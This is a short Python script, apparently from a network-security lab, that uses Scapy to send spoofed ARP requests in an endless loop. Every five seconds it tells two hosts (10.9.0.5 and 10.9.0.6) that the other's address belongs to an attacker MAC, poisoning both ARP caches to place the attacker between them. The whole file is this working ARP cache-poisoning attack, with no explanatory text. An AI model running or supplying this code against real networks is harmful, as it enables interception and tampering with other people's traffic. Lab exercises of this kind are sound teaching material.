from scapy.all import *
import time

a_ip = "10.9.0.5"
b_ip = "10.9.0.6"
m_mac = "02:42:0a:09:00:69"

def send_arp_request(ip_src, ip_dest):
    E = Ether()
    E.dst = "ff:ff:ff:ff:ff:ff"

    A = ARP()
    A.op = 1
    A.psrc = ip_src
    A.pdst = ip_dest
    A.hwsrc = m_mac
    A.hwdst = "ff:ff:ff:ff:ff:ff"

    pkt = E/A
    sendp(pkt)
    print(f"Sent ARP request from {ip_src} to {ip_dest}")

while True:
    send_arp_request(a_ip, b_ip)
    send_arp_request(b_ip, a_ip)
    time.sleep(5)